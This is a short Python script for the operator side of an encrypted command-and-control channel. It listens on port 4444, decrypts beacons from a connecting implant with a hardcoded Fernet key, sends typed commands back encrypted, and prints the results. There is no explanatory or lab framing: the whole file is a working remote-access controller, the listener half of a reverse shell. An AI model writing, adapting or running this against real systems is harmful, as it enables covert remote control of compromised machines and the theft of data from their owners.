import socket
from cryptography.fernet import Fernet

key = b'N13E54NxFeO9-_Lmv7fKvKLcQdiy6o5EqTpMyTQMb_U='
cipher = Fernet(key)

HOST = "192.168.100.1"
PORT = 4444

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(1)

print("[+] Server listening...")

conn, addr = server.accept()
print(f"[+] Connected from {addr}")

while True:
    try:
        data = conn.recv(4096)
        beacon = cipher.decrypt(data).decode()

        print("[BEACON]:", beacon)

        cmd = input("Enter command: ")
        conn.send(cipher.encrypt(cmd.encode()))

        if cmd.lower() == "exit":
            break

        result = conn.recv(4096)
        print("[RESULT]:\n", cipher.decrypt(result).decode())

    except:
        break

conn.close()
